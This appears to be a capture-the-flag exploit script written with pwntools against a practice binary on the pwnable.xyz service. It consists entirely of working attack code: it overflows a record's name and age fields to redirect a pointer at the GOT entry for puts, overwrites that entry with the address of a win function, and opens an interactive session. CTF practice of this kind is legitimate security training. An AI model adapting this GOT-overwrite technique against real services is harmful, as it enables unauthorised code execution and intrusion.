#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30011)
#gdb.attach(p)
elf = ELF("./challenge")
win = elf.symbols['win']

p.sendafter("> ", '1')
p.sendafter("Name: ", 'A'*0x20)
p.sendlineafter("Age: ", str(1))

p.sendafter("> ", '3')
p.sendafter("Name: ", 'C'*0x20)
p.sendafter("Age: ", 'D'*0x10+p64(elf.got['puts']))

p.sendafter("> ", '3')
p.sendafter("Name: ", p64(win))
p.sendafter("Age: ", str(1))

p.interactive()
